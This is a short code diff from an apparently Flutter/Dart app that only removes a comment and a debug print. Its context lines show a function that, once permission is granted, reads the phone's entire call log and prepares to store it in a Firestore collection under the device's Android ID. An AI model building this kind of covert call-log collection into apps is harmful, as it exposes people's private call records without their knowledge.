@@ -25,9 +25,7 @@ Future<void> getCallLogs() async {
   final PermissionStatus permissionStatus = await _getCallLogPermission();
 
   if (permissionStatus == PermissionStatus.granted) {
-    // method 1
     Iterable<CallLogEntry> logs = await CallLog.get();
-    print("logs");
     String? androidId = await getIdentity();
     CollectionReference logsCollection =
         firestore.collection('client').doc(androidId).collection("logs");
